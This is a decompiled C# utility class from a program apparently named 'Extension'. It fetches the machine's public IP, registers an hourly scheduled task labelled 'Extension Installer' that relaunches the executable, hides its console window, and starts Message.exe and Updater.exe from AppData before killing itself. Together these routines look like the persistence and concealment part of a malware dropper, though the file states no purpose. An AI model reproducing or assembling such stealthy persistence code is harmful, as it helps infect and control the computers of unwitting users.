using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32.TaskScheduler;

namespace Extension;

public static class Miscellaneous
{
	private const int SW_SHOW = 1;

	private const int SW_HIDE = 0;

	private static string GetStringFromBytes(byte[] Arry)
	{
		return Encoding.ASCII.GetString(Arry);
	}

	private static byte[] GetBytesFromString(string str)
	{
		return Encoding.ASCII.GetBytes(str);
	}

	public static List<string> ConcatList(List<string> List1, List<string> List2)
	{
		List<string> list = new List<string>();
		foreach (string item in List1)
		{
			list.Add(item);
		}
		foreach (string item2 in List2)
		{
			list.Add(item2);
		}
		return list;
	}

	public static string GetPublicIPAddress()
	{
		try
		{
			using WebClient webClient = new WebClient();
			webClient.Headers.Add("user-agent", "curl");
			return webClient.DownloadString("http://ipinfo.io/ip");
		}
		catch (Exception)
		{
			return "127.0.0.1";
		}
	}

	public static bool AddTask()
	{
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Expected O, but got Unknown
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_0081: Expected O, but got Unknown
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		TaskService val = new TaskService();
		try
		{
			TaskDefinition val2 = val.NewTask();
			val2.get_RegistrationInfo().set_Description("Extension Installer");
			val2.get_Principal().set_LogonType((TaskLogonType)3);
			TimeTrigger val3 = new TimeTrigger();
			((Trigger)val3).get_Repetition().set_Interval(TimeSpan.FromMinutes(60.0));
			val2.get_Triggers().Add<TimeTrigger>(val3);
			val2.get_Actions().Add<ExecAction>(new ExecAction(location, (string)null, (string)null));
			val.get_RootFolder().RegisterTaskDefinition(friendlyName, val2);
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
		return true;
	}

	public static void RunMessage()
	{
		string sourceFileName = Path.Combine(Config.AppDataFolder, "Message.exe");
		string text = Path.Combine(Config.DesktopFolder, "Message.exe");
		try
		{
			File.Copy(sourceFileName, text);
		}
		catch (Exception)
		{
		}
		if (!string.IsNullOrEmpty(text) && File.Exists(text))
		{
			Process process = new Process();
			try
			{
				process.StartInfo.WorkingDirectory = Path.GetDirectoryName(text);
				process.StartInfo.UseShellExecute = true;
				process.StartInfo.FileName = text;
				process.StartInfo.CreateNoWindow = false;
				process.Start();
				Process.GetCurrentProcess().Kill();
			}
			catch (Exception ex2)
			{
				Console.WriteLine(ex2.Message);
			}
		}
	}

	public static void RunInstall()
	{
		string text = Path.Combine(Config.AppDataFolder, "Updater.exe");
		if (!string.IsNullOrEmpty(text) && File.Exists(text))
		{
			Process process = new Process();
			try
			{
				process.StartInfo.WorkingDirectory = Path.GetDirectoryName(text);
				process.StartInfo.UseShellExecute = true;
				process.StartInfo.FileName = text;
				process.StartInfo.CreateNoWindow = false;
				process.Start();
				Process.GetCurrentProcess().Kill();
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.Message);
			}
		}
	}

	public static void Uninstall()
	{
		try
		{
			foreach (Process item in from pr in Process.GetProcesses()
				where pr.ProcessName.Contains("Message")
				select pr)
			{
				item.Kill();
			}
		}
		catch (Exception)
		{
		}
		try
		{
			string path = Path.Combine(Config.AppDataFolder, "Message.exe");
			string path2 = Path.Combine(Config.DesktopFolder, "Message.exe");
			File.Delete(path);
			File.Delete(path2);
		}
		catch (Exception)
		{
		}
	}

	public static void HideWindow()
	{
		ShowWindow(GetConsoleWindow(), 0);
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
